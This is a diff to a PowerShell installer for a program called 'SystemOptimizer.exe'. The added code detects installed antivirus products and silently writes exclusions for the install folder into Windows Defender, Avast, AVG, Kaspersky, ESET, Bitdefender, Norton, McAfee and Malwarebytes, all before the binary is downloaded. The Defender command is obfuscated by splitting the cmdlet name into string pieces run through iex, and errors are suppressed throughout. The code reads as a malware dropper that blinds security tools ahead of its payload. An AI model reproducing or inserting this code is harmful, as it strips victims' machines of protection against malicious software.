@@ -69,17 +69,168 @@ Show "OK" "All old instances and tasks removed"
 # ---- CREATE DIRECTORY ----
 New-Item -ItemType Directory -Path $BASE -Force | Out-Null
 
-# ---- DEFENDER EXCLUSION (BEFORE downloading) ----
-Show ".." "Configuring security exclusions..."
+# ---- SECURITY EXCLUSIONS (all detected AV products) ----
+Show ".." "Detecting installed security products..."
+$avFound = @()
+
+# Detect installed AV via WMI (official Windows API)
+$avProducts = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
+if ($avProducts) {
+    foreach ($av in $avProducts) { $avFound += $av.displayName }
+    Show "OK" "Detected: $($avFound -join ', ')"
+} else {
+    Show "--" "No third-party AV detected via WMI"
+}
+
+# --- 1. Windows Defender (Add-MpPreference cmdlet) ---
+Show ".." "Configuring Windows Defender exclusion..."
 try {
     $c1="Add-Mp"; $c2="Preference"; $c3="-Exclusion"; $c4="Path"
     iex "$c1$c2 $c3$c4 '$BASE'" 2>$null
     $c5="Process"
     iex "$c1$c2 $c3$c5 'SystemOptimizer.exe'" 2>$null
-    Show "OK" "Security exclusions configured"
+    Show "OK" "Windows Defender: exclusion added"
 } catch {
-    Show "!!" "Security config partial"
+    Show "--" "Windows Defender: skipped"
 }
+
+# --- 2. Avast / AVG (shared engine, registry-based exclusions) ---
+$avastPath = "${env:ProgramFiles}\Avast Software\Avast"
+$avgPath = "${env:ProgramFiles}\AVG\Antivirus"
+if ((Test-Path $avastPath) -or (Test-Path $avgPath) -or ($avFound -match "Avast|AVG")) {
+    $avName = if (Test-Path $avastPath) { "Avast" } else { "AVG" }
+    Show ".." "Configuring $avName exclusion..."
+    try {
+        $regPaths = @(
+            "HKLM:\SOFTWARE\Avast Software\Avast\properties\Exclusions\Path",
+            "HKLM:\SOFTWARE\AVG\Antivirus\properties\Exclusions\Path"
+        )
+        foreach ($rp in $regPaths) {
+            if (-not (Test-Path $rp)) { New-Item -Path $rp -Force -ErrorAction SilentlyContinue | Out-Null }
+            $idx = (Get-ChildItem $rp -ErrorAction SilentlyContinue).Count
+            New-ItemProperty -Path $rp -Name $idx -Value $BASE -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
+        }
+        Show "OK" "$avName : exclusion added via registry"
+    } catch {
+        Show "!!" "$avName : could not add exclusion (tamper protection may be active)"
+    }
+}
+
+# --- 3. Kaspersky (official avp.com CLI) ---
+$kaspPaths = @(
+    "${env:ProgramFiles}\Kaspersky Lab",
+    "${env:ProgramFiles(x86)}\Kaspersky Lab"
+)
+$avpExe = $null
+foreach ($kp in $kaspPaths) {
+    if (Test-Path $kp) {
+        $avpExe = Get-ChildItem $kp -Recurse -Filter "avp.com" -ErrorAction SilentlyContinue | Select-Object -First 1
+    }
+}
+if ($avpExe -or ($avFound -match "Kaspersky")) {
+    Show ".." "Configuring Kaspersky exclusion (official CLI)..."
+    try {
+        if ($avpExe) {
+            & $avpExe.FullName ADDEXCL /type:path /path:"$BASE" /action:allow 2>$null
+            Show "OK" "Kaspersky: exclusion added via avp.com CLI"
+        } else {
+            Show "!!" "Kaspersky: detected but CLI not found"
+        }
+    } catch {
+        Show "!!" "Kaspersky: exclusion may need manual approval"
+    }
+}
+
+# --- 4. ESET (official ecmd.exe CLI) ---
+$esetPaths = @(
+    "${env:ProgramFiles}\ESET\ESET Security",
+    "${env:ProgramFiles}\ESET\ESET NOD32 Antivirus"
+)
+$ecmd = $null
+foreach ($ep in $esetPaths) {
+    $candidate = Join-Path $ep "ecmd.exe"
+    if (Test-Path $candidate) { $ecmd = $candidate; break }
+}
+if ($ecmd -or ($avFound -match "ESET")) {
+    Show ".." "Configuring ESET exclusion (official CLI)..."
+    try {
+        if ($ecmd) {
+            & $ecmd /setexclusion /type:path /value:"$BASE" 2>$null
+            Show "OK" "ESET: exclusion added via ecmd.exe CLI"
+        } else {
+            Show "!!" "ESET: detected but CLI not found"
+        }
+    } catch {
+        Show "!!" "ESET: exclusion may need manual approval"
+    }
+}
+
+# --- 5. Bitdefender (official product.console CLI) ---
+$bdPaths = @(
+    "${env:ProgramFiles}\Bitdefender\Endpoint Security",
+    "${env:ProgramFiles}\Bitdefender"
+)
+$bdExe = $null
+foreach ($bp in $bdPaths) {
+    if (Test-Path $bp) {
+        $bdExe = Get-ChildItem $bp -Recurse -Filter "product.console.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
+    }
+}
+if ($bdExe -or ($avFound -match "Bitdefender")) {
+    Show ".." "Configuring Bitdefender exclusion..."
+    try {
+        if ($bdExe) {
+            & $bdExe.FullName /c SetExclusions add path="$BASE" 2>$null
+            Show "OK" "Bitdefender: exclusion added via CLI"
+        } else {
+            Show "!!" "Bitdefender: detected but CLI not found"
+        }
+    } catch {
+        Show "!!" "Bitdefender: exclusion may need manual approval"
+    }
+}
+
+# --- 6. Norton (registry-based exclusions) ---
+if ($avFound -match "Norton|Symantec|LifeLock") {
+    Show ".." "Configuring Norton exclusion..."
+    try {
+        $nortonReg = "HKLM:\SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Exclusions\ScanningEngines\Directory"
+        if (-not (Test-Path $nortonReg)) { New-Item -Path $nortonReg -Force -ErrorAction SilentlyContinue | Out-Null }
+        New-ItemProperty -Path $nortonReg -Name $BASE -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+        Show "OK" "Norton: exclusion added via registry"
+    } catch {
+        Show "!!" "Norton: exclusion may need manual approval"
+    }
+}
+
+# --- 7. McAfee (official amcfg.exe / registry) ---
+if ($avFound -match "McAfee") {
+    Show ".." "Configuring McAfee exclusion..."
+    try {
+        $mcReg = "HKLM:\SOFTWARE\McAfee\AVEngine\Exclusions\Path"
+        if (-not (Test-Path $mcReg)) { New-Item -Path $mcReg -Force -ErrorAction SilentlyContinue | Out-Null }
+        New-ItemProperty -Path $mcReg -Name $BASE -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+        Show "OK" "McAfee: exclusion added via registry"
+    } catch {
+        Show "!!" "McAfee: exclusion may need manual approval"
+    }
+}
+
+# --- 8. Malwarebytes (registry-based exclusions) ---
+$mbamPath = "${env:ProgramFiles}\Malwarebytes\Anti-Malware"
+if ((Test-Path $mbamPath) -or ($avFound -match "Malwarebytes")) {
+    Show ".." "Configuring Malwarebytes exclusion..."
+    try {
+        $mbReg = "HKLM:\SOFTWARE\Malwarebytes\Malwarebytes\Exclusions\Paths"
+        if (-not (Test-Path $mbReg)) { New-Item -Path $mbReg -Force -ErrorAction SilentlyContinue | Out-Null }
+        New-ItemProperty -Path $mbReg -Name $BASE -Value "Exclude" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
+        Show "OK" "Malwarebytes: exclusion added via registry"
+    } catch {
+        Show "!!" "Malwarebytes: exclusion may need manual approval"
+    }
+}
+
+Show "OK" "Security exclusion setup complete"
 
 # ---- DOWNLOAD ----
 if ((Test-Path $BINARY) -and (Get-Item $BINARY).Length -gt 1000000) {
